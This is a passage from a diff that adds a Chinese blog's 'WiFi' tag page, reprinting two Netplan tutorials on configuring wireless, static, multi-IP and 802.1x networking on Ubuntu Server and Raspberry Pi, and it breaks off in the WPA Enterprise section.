@@ -1,0 +1,1165 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    
+    <title>Tag: WiFi | 氕氘氚</title>
+    <meta name="keywords" content="hexo,theme,otakism,otaku"/>
+    <meta name="HandheldFriendly" content="True"/>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="google-site-verification" content=""/>
+    <meta name="baidu-site-verification" content=""/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="Open your eyes to see the light in life">
+<meta property="og:type" content="website">
+<meta property="og:title" content="氕氘氚">
+<meta property="og:url" content="https://szczecin.github.io/tags/WiFi/index.html">
+<meta property="og:site_name" content="氕氘氚">
+<meta property="og:description" content="Open your eyes to see the light in life">
+<meta property="og:locale">
+<meta property="article:author" content="Szczecin">
+<meta name="twitter:card" content="summary">
+    
+
+    <!-- Favicon -->
+    
+        <link rel="icon" href="/img/favicon.ico" />
+    
+
+    <!-- Font -->
+    <link href="https://fonts.googleapis.com/css?family=Inconsolata|Roboto:300,400,700" rel="stylesheet">
+
+    
+<link rel="stylesheet" href="/style.css">
+
+    <script>
+      function setLoadingBarProgress(num) {
+        document.getElementById('loading-bar').style.width = num + "%";
+      }
+    </script>
+
+    
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+
+<script>setLoadingBarProgress(20)</script>
+
+<div id="site-wrapper">
+
+    <header id="header">
+    <div id="header-wrapper" class="clearfix">
+        <a id="logo" href="/">
+            <img src="/img/logo.png"/>
+            <span id="site-desc">
+                Be A Gorgeous World
+            </span>
+        </a>
+        <button id="site-nav-switch">
+            <span class="icon icon-menu"></span>
+        </button>
+    </div>
+</header>
+    <script>setLoadingBarProgress(40);</script>
+
+    <main id="main" role="main">
+        
+  <section class="page-header tag">
+    <h1>- <span>WiFi</span> -</h1>
+  </section>
+
+
+
+
+
+
+<section class="post-list">
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2025/11/21/Netplan-Ubuntu/">
+                Ubuntu Server 配置无线网络
+            </a>
+        </h2>
+    
+    <time>
+        Nov 21, 2025
+    </time>
+    <section class="content">
+        <h1><span id="ubuntu-server-配置无线网络">Ubuntu Server 配置无线网络</span></h1><blockquote>
+<p>本文转自 <a target="_blank" rel="noopener" href="https://muzing.top/posts/9cbf7452/">muzing</a> 并作补充</p>
+</blockquote>
+<blockquote>
+<p>本文简单记录了在 Ubuntu Server 22.04 上通过 <a target="_blank" rel="noopener" href="https://netplan.io/">Netplan</a> 工具配置网络，连接到 WLAN 的过程。</p>
+</blockquote>
+<h2><span id="准备工作">准备工作</span></h2><blockquote>
+<p>安装无线网络相关配置工具：</p>
+<ul>
+<li>network-manager - 网络管理工具</li>
+<li>wpasupplicant - 提供对 WPA 加密的支持</li>
+<li>wireless-tools - 提供 iwconfig、iwlist 等无线网络配置工具</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install network-manager wpasupplicant wireless-tools</span><br></pre></td></tr></table></figure>
+
+<p>查看网卡硬件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifconfig -a</span><br><span class="line"><span class="comment"># 或者使用</span></span><br><span class="line">ip a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/21/Netplan-Ubuntu/1.png" alt="image"></p>
+<p>根据上面的查询结果获得无线网卡名称，记住该名称。（无线网卡的名称一般以 <code>wlan</code> 或 <code>wlp</code> 开头，详情参考本文<a target="_blank" rel="noopener" href="https://muzing.top/posts/9cbf7452/#%E9%99%84%E5%BD%95a%E7%BD%91%E5%8D%A1%E8%AE%BE%E5%A4%87%E5%90%8D%E7%A7%B0%E7%AE%80%E6%9E%90">附录a</a>。）</p>
+<p>如果没有看到列出无线网卡，除硬件故常或接触不良外，还可能是因为无线网卡未启动。可以尝试使用如下命令将其启动：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig wlan0 up  <span class="comment"># 启动名为 wlan0 的网络设备</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="扫描无线网络">扫描无线网络</span></h2><blockquote>
+<p>在准备工作中已经安装了 wireless-tools，可以使用 iwlist 命令扫描当前环境中的 Wi-Fi 信号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo iwlist wlan0 scan  # 注意将 wlan0 换成实际无线网卡的设备名</span><br></pre></td></tr></table></figure>
+
+<p>输出的结果非常详细，也非常长：</p>
+<p><img src="/2025/11/21/Netplan-Ubuntu/2.png" alt="image"></p>
+<p>如果太多信息造成干扰，可以使用 Linux 的 grep 命令对输出信息进行筛选，例如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo iwlist wlan0 scan | grep ESSID  <span class="comment"># 仅查看 Wi-Fi 名称</span></span><br><span class="line">sudo iwlist wlan0 scan | grep -E <span class="string">&quot;Quality|ESSID&quot;</span>  <span class="comment"># 查看 Wi-Fi 名称和网络质量</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/21/Netplan-Ubuntu/3.png" alt="image"></p>
+</blockquote>
+<h2><span id="编辑配置文件">编辑配置文件</span></h2><blockquote>
+<p>进入 Netplan 配置目录，查看其中的默认配置文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /etc/netplan/</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">50-cloud-init.yaml</span><br></pre></td></tr></table></figure>
+
+<p>此机器上的配置文件名为 <code>50-cloud-init.yaml</code>。由于安装方式、系统版本等差异，配置文件的名称可能有所不同，但都是 yaml 格式、位于 <code>/etc/netplan/</code> 下，根据实际情况使用。使用管理员权限编辑该文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/netplan/50-cloud-init.yaml</span><br></pre></td></tr></table></figure>
+
+<p>添加如下内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wifis:</span><br><span class="line">  wlan0:</span><br><span class="line">    dhcp4: <span class="literal">true</span></span><br><span class="line">    access-points:</span><br><span class="line">      <span class="string">&quot;你的ssid&quot;</span>:</span><br><span class="line">        password: <span class="string">&quot;你的密码&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>wlan0</code> 为无线网卡名称，<code>dhcp4</code> 表示开启自动IP地址分配，在 access-points 下可以设置多组 ssid（即通常所说的“Wi-Fi名称”）与密码。</p>
+<p>更新后，配置文件内容大致如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: NetworkManager</span><br><span class="line">  </span><br><span class="line">  ethernets:</span><br><span class="line">    eth0:</span><br><span class="line">      dhcp4: <span class="literal">true</span></span><br><span class="line">      optional: <span class="literal">true</span></span><br><span class="line">      </span><br><span class="line">  wifis:</span><br><span class="line">    wlan0:</span><br><span class="line">      dhcp4: <span class="literal">true</span></span><br><span class="line">      access-points:</span><br><span class="line">        <span class="string">&quot;wifi_name1&quot;</span>:</span><br><span class="line">          password: <span class="string">&quot;mypassword&quot;</span></span><br><span class="line">        <span class="string">&quot;666&quot;</span>:</span><br><span class="line">          password: <span class="string">&quot;66666666&quot;</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="连接网络">连接网络</span></h2><blockquote>
+<p>修改配置文件后，不要立即将其应用生效，而要先使用 netplan try 命令验证新的配置是否有效：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo netplan try  <span class="comment"># 检查配置文件中是否有语法错误、尝试用新的配置</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/21/Netplan-Ubuntu/4.png" alt="image"></p>
+<p>如果新的网络配置没有问题，则会出现上面的界面，按下键盘 ENTER 确认即可。如果此时本来就是通过网络以 SSH 方式控制服务器，而新的网络配置出现问题导致连接断开，也不必惊慌，等待两分钟让 netplan 恢复之前的配置即可。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo netplan generate  <span class="comment"># 生成 renderers 所需的配置文件</span></span><br><span class="line">sudo netplan apply  <span class="comment"># 应用 netplan 新配置，将自动重启 network-manager 使修改生效</span></span><br></pre></td></tr></table></figure>
+
+<p>检查是否已连接至网络（以下任一条命令均可）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iwconfig</span><br><span class="line">ifconfig</span><br><span class="line">ip a</span><br></pre></td></tr></table></figure>
+
+<p>如仍未连接至网络，可以尝试手动重启 NetworkManager 或服务器：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart NetworkManager.service</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="附录a网卡设备名称简析">附录a：网卡设备名称简析</span></h2><blockquote>
+<p>在使用 <code>ifconfig -a</code> 或 <code>ip a</code> 列出本机所有网卡设备名称时，可能看到若干名称，其含义简单分析如下：</p>
+<ul>
+<li><code>lo</code> 表示 <code>local</code></li>
+<li><code>en</code> 表示 <code>ethernet</code> 以太网</li>
+<li><code>wl</code> 表示 <code>wlan</code>，即 Wireless Local Area Network 无线局域网</li>
+<li>后面的 <code>p2s0</code> 等表示 PCIe 接口的物理位置(bus, slot)，总线与插槽</li>
+</ul>
+<p>例如， <code>wlp4s0</code> 表示一张位于 PCIe 总线4 插槽0 的无线网卡。</p>
+</blockquote>
+<h2><span id="附录b树莓派连接无线网络">附录b：树莓派连接无线网络</span></h2><blockquote>
+<p>在使用新安装 Ubuntu Server 系统的树莓派时，可能遇到手头没有显示器、也没有有线网络连接的情况。这时本可以通过电脑 SSH 连接至树莓派进行远程开发，但前提是树莓派必须已经接入无线局域网络；而为了让树莓派接入网络，又需要用 SSH 连接后才能修改 Netplan 配置文件，陷入僵局。解决问题的办法是，在树莓派系统启动之前就完成对网络的配置：通过修改安装着树莓派的操作系统的存储卡中的特定文件即可实现。</p>
+<p>将存储卡通过读卡器连接到电脑，可以看到 system-boot 和 writable 两个分区，打开 system-boot 分区，搜索名为 <code>network-config</code> 的文件：</p>
+<p><img src="/2025/11/21/Netplan-Ubuntu/5.png" alt="image"></p>
+<p>使用文本编辑工具打开该文件：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># This file contains a netplan-compatible configuration which cloud-init will</span></span><br><span class="line"><span class="comment"># apply on first-boot (<span class="doctag">note:</span> it will *not* update the config after the first</span></span><br><span class="line"><span class="comment"># boot). Please refer to the cloud-init documentation and the netplan reference</span></span><br><span class="line"><span class="comment"># for full details:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># https://netplan.io/reference</span></span><br><span class="line"><span class="comment"># https://cloudinit.readthedocs.io/en/latest/topics/network-config.html</span></span><br><span class="line"><span class="comment"># https://cloudinit.readthedocs.io/en/latest/topics/network-config-format-v2.html</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Some additional examples are commented out below</span></span><br><span class="line"></span><br><span class="line"><span class="attr">network:</span></span><br><span class="line">  <span class="attr">version:</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">ethernets:</span></span><br><span class="line">    <span class="attr">eth0:</span></span><br><span class="line">      <span class="attr">dhcp4:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">optional:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  wifis:</span></span><br><span class="line"><span class="comment">#    wlan0:</span></span><br><span class="line"><span class="comment">#      dhcp4: true</span></span><br><span class="line"><span class="comment">#      optional: true</span></span><br><span class="line"><span class="comment">#      access-points:</span></span><br><span class="line"><span class="comment">#        myhomewifi:</span></span><br><span class="line"><span class="comment">#          password: &quot;S3kr1t&quot;</span></span><br><span class="line"><span class="comment">#        myworkwifi:</span></span><br><span class="line"><span class="comment">#          password: &quot;correct battery horse staple&quot;</span></span><br><span class="line"><span class="comment">#        workssid:</span></span><br><span class="line"><span class="comment">#          auth:</span></span><br><span class="line"><span class="comment">#            key-management: eap</span></span><br><span class="line"><span class="comment">#            method: peap</span></span><br><span class="line"><span class="comment">#            identity: &quot;me@example.com&quot;</span></span><br><span class="line"><span class="comment">#            password: &quot;passw0rd&quot;</span></span><br><span class="line"><span class="comment">#            ca-certificate: /etc/my_ca.pem</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到，该文件的格式与语法正是 Netplan 形式，用于在首次启动系统时初始化 Netplan 配置。参考原本注释掉的示例和本文正文，编辑该配置文件，添加 Wi-Fi 信息并保存。</p>
+<p>完成配置文件的编辑后，将存储卡插回到树莓派中，通电开机，即会自动连接至无线网络。进入路由器后台管理，即可看到设备名为 ubuntu 的设备，记住其局域网 IP 地址，在电脑上使用 ssh 连接即可：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh ubuntu@192.168.3.24</span><br></pre></td></tr></table></figure>
+
+<p>如果没有路由器的管理员权限，无法进入后台查看树莓派的 IP，可以在电脑上尝试使用 <a target="_blank" rel="noopener" href="https://angryip.org/">Angry IP Scanner</a> 等 IP 扫描工具寻找。</p>
+</blockquote>
+<h2><span id="附录cnetplan原理简述">附录c：Netplan原理简述</span></h2><blockquote>
+<p>Netplan 本身只是一个用于网络配置的辅助小工具，它将读取 <code>/etc/netplan/*.yaml</code> 配置文件，然后据此生成 renderer 所需的配置文件，并重启 renderer 使修改生效。目前 Netplan 支持的 renderer 包括 <a target="_blank" rel="noopener" href="https://help.ubuntu.com/community/NetworkManager">NetworkManager</a> 与 <a target="_blank" rel="noopener" href="http://manpages.ubuntu.com/manpages/bionic/man5/systemd.network.5.html">Systemd-networkd</a> 两种。这样用户只需修改简洁清晰、YAML格式、统一的 Netplan 配置文件，而无需为每个 renderer 编辑其配置文件。</p>
+<p><img src="/2025/11/21/Netplan-Ubuntu/6.png" alt="image"></p>
+</blockquote>
+<h2><span id="参考">参考</span></h2><blockquote>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://netplan.readthedocs.io/en/stable/">Netplan 官方文档</a></li>
+</ul>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Netplan/" rel="tag">Netplan</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/WiFi/" rel="tag">WiFi</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2025/11/21/Netplan-Config/">
+                netplan网络配置
+            </a>
+        </h2>
+    
+    <time>
+        Nov 21, 2025
+    </time>
+    <section class="content">
+        <h1><span id="netplan网络配置">netplan网络配置</span></h1><blockquote>
+<p>本文转自 <a target="_blank" rel="noopener" href="https://cloud-atlas.readthedocs.io/zh-cn/latest/linux/ubuntu_linux/network/netplan.html">cloud-atlas</a> 并作补充</p>
+</blockquote>
+<blockquote>
+<p>Ubuntu发行版默认使用 <a target="_blank" rel="noopener" href="https://netplan.io/">netplan.io</a> 配置网络接口，例如我在在 <a target="_blank" rel="noopener" href="https://cloud-atlas.readthedocs.io/zh-cn/latest/raspberry_pi/network/pi_ubuntu_network.html#pi-ubuntu-network">树莓派Ubuntu网络设置</a> 中就使用了netplan。netplan支持后端使用 <code>networkd</code> 或者 <code>network-manager</code> 进行管理配置。</p>
+</blockquote>
+<h2><span id="netplan简介">netplan简介</span></h2><blockquote>
+<p><img src="/2025/11/21/Netplan-Config/1.svg" alt="image"></p>
+</blockquote>
+<h2><span id="激活netplan">激活netplan</span></h2><blockquote>
+<p>Ubuntu在服务器版本默认激活了netplan来配置管理网络，但是在桌面版本，则默认使用NetworkManager管理网络。例如 <a target="_blank" rel="noopener" href="https://cloud-atlas.readthedocs.io/zh-cn/latest/machine_learning/jetson/studio/jetson_nano_startup.html#jetson-nano-startup">Jetson Nano快速起步</a> 可以看到Jetson使用Ubuntu的18.04桌面版本，所以我们需要安装并激活netplan。</p>
+<ul>
+<li><p>安装netplan:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install netplan.io</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>备注</strong></p>
+<p>在 <code>Ubuntu 18.04.4 LTS</code> 上，提供了2个软件包:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netplan</span><br><span class="line">netplan.io</span><br></pre></td></tr></table></figure>
+
+<p>建议完整安装 <code>netplan.io</code> ，这个版本跟随 <a target="_blank" rel="noopener" href="https://netplan.io/">netplan.io</a> 官方更新，修复了一些问题。</p>
+<p>当前 <code>Ubuntu 20.04.3 LTS</code> 已默认安装 <code>netplan.io</code> ，不再提供旧版本 <code>netplan</code></p>
+</blockquote>
+<h2><span id="使用netplan配置静态ip">使用netplan配置静态IP</span></h2><blockquote>
+<p>对于Kubernetes master等服务器，我期望IP地址是固定的IP地址，所以准备配置static IP。不过，Ubuntu 18系列的静态IP地址配置方法和以前传统配置方法不同，采用了 <code>.yaml</code> 配置文件，通过 <code>netplan</code> 网络配置工具来修改。</p>
+<p><strong>备注</strong></p>
+<p>根据Ubuntu的安装不同，有可能你的安装并没有包含Netplan，则依然可以采用传统的Debian&#x2F;Ubuntu配置静态IP的方法，即直接修改 <code>/etc/network/interfaces</code> 来实现。不过，从Ubuntu 17.10 开始，已经引入了 Netplan 网络配置工具。</p>
+<p>Netplan允许通过YAML抽象来配置网络接口，在 <code>NetworkManager</code> 和 <code>systemd-networkd</code> 网络服务（引用为 <code>renderers</code> )结合共同工作。</p>
+<p>Netplan会读取 <code>/etc/netplan/*.yaml</code> 配置文件来设置所有的网络接口。</p>
+</blockquote>
+<h3><span id="列出所有激活的网络接口">列出所有激活的网络接口</span></h3><blockquote>
+<ul>
+<li><p>使用 <code>ifconfig</code> 命令列出所有网络接口:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig -a</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>例如，看到的输出数据（DHCP）:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ens2: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.122.61  netmask 255.255.255.0  broadcast 192.168.122.255</span><br><span class="line">        inet6 fe80::5054:ff:fe97:c338  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 52:54:00:97:c3:38  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 382  bytes 45170 (45.1 KB)</span><br><span class="line">        RX errors 0  dropped 84  overruns 0  frame 0</span><br><span class="line">        TX packets 165  bytes 22890 (22.8 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>默认在 <code>/etc/netplan</code> 目录下有一个 <code>01-netcfg.yaml</code> 内容如下:</li>
+</ul>
+<p>netplan初始DHCP配置</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># This file describes the network interfaces available on your system</span></span><br><span class="line"><span class="comment"># For more information, see netplan(5).</span></span><br><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: networkd</span><br><span class="line">  ethernets:</span><br><span class="line">    ens2:</span><br><span class="line">      dhcp4: yes</span><br></pre></td></tr></table></figure>
+
+<p><strong>备注</strong></p>
+<p>如果安装操作系统的时候没有自动创建一个 <code>YAML</code> 配置文件，可以通过以下命令先生成一个:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo netplan generate</span><br></pre></td></tr></table></figure>
+
+<p>不过，对于Ubuntu的desktop, server, cloud版本，自动生成的配置文件会采用不同的名字，例如 <code>01-network-manager-all.yaml</code> 或 <code>01-netcfg.yaml</code> 。</p>
+<ul>
+<li>编辑 <code>/etc/netplan/01-netcfg.yaml</code> :</li>
+</ul>
+<p>netplan 静态IPP配置</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: networkd</span><br><span class="line">  ethernets:</span><br><span class="line">    ens2:</span><br><span class="line">      dhcp4: no</span><br><span class="line">      dhcp6: no</span><br><span class="line">      addresses: <span class="section">[192.168.122.11/24, ]</span></span><br><span class="line">      gateway4: 192.168.122.1</span><br><span class="line">      nameservers:</span><br><span class="line">         addresses: <span class="section">[192.168.122.1, ]</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>执行以下命令生效（注意在控制台执行，否则网络会断开）:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo netplan apply</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>验证检查 <code>ifconfig -a</code> 可以看到IP地址已经修改成静态配置IP地址</p>
+</li>
+</ul>
+</blockquote>
+<h2><span id="netplan配置一个网卡多个ip">netplan配置一个网卡多个IP</span></h2><blockquote>
+<p>有时候需要在一个网卡上配置多个IP地址，实现单臂网桥路由，netplan也支持 interface alias 。配置方法很简单:</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: networkd</span><br><span class="line">  ethernets:</span><br><span class="line">    enp3s0:</span><br><span class="line">     addresses:</span><br><span class="line">       - 10.100.1.38/24</span><br><span class="line">       - 10.100.1.39/24</span><br><span class="line">     gateway4: 10.100.1.1</span><br></pre></td></tr></table></figure>
+
+<p>或者:</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ethernets:</span><br><span class="line">  enp3s0:</span><br><span class="line">   addresses: <span class="section">[ 10.100.1.38/24, 10.100.1.39/24 ]</span></span><br></pre></td></tr></table></figure>
+
+<p>执行 <code>netplan apply</code> 可以看到系统网卡:</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">enp3s0</span><br><span class="line">enp3s0:1</span><br></pre></td></tr></table></figure>
+
+<p>分配了IP地址 <code>10.100.1.38</code> 和 <code>10.100.1.39</code></p>
+</blockquote>
+<h2><span id="netplan配置有线8021x认证">netplan配置有线802.1x认证</span></h2><blockquote>
+<p>企业网络常常会使用802.1x网络实现认证，不仅无线可以通过这种方式加强安全，有线网络也可以实现。netplan也支持在有线网络上加上认证功能，配置案例有些类似后文 <code>WPA Enterprise无线网络</code> ，案例 <code>01-eno4-config.yaml</code> 如下:</p>
+<p>netplan 802.1x配置</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: networkd</span><br><span class="line">  ethernets:</span><br><span class="line">    eno4:</span><br><span class="line">      dhcp4: yes</span><br><span class="line">      dhcp6: no</span><br><span class="line">      macaddress: xx:xx:xx:xx:xx:xx</span><br><span class="line">      auth:</span><br><span class="line">        key-management: 802.1x</span><br><span class="line">        method: peap</span><br><span class="line">        identity: &quot;USERNAME&quot;</span><br><span class="line">        password: &quot;PASSWD&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后执行 <code>netplan apply</code> 即完成网络激活</p>
+</blockquote>
+<h2><span id="netplan配置无线">netplan配置无线</span></h2><h3><span id="连接开放无线网络">连接开放无线网络</span></h3><blockquote>
+<p>对于没有密码要求的无线网络，只需要定义access point:</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  wifis:</span><br><span class="line">    wlan0:</span><br><span class="line">      access-points:</span><br><span class="line">        &quot;open_network_ssid_name&quot;: &#123;&#125;</span><br><span class="line">      dhcp4: yes</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="连接wpa-personal无线">连接WPA Personal无线</span></h3><blockquote>
+<p>对于采用WPA密码保护的无线网络，配置access-point和对应的password就可以。</p>
+<ul>
+<li><p>配置 <code>/etc/netplan/02-homewifi.yaml</code></p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: networkd</span><br><span class="line">  wifis:</span><br><span class="line">    wlan0:</span><br><span class="line">      dhcp4: yes</span><br><span class="line">      dhcp6: no</span><br><span class="line">      <span class="comment">#addresses: [192.168.1.21/24]</span></span><br><span class="line">      <span class="comment">#gateway4: 192.168.1.1</span></span><br><span class="line">      <span class="comment">#nameservers:</span></span><br><span class="line">      <span class="comment">#  addresses: [192.168.0.1, 8.8.8.8]</span></span><br><span class="line">      access-points:</span><br><span class="line">        &quot;network_ssid_name&quot;:</span><br><span class="line">          password: &quot;**********&quot;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</blockquote>
+<h3><span id="wpa-enterprise无线网络">WPA Enterprise无线网络</span></h3><blockquote>
+<p>在企业网络中，常见的是使用 WPA 或 WPA2 Enterprise加密方式的无线网络，则需要添加认证信息。</p>
+<ul>
+<li><p>以下案例是 WPA-EAP 和 TTLS 加密无线网络连接配置:</p>
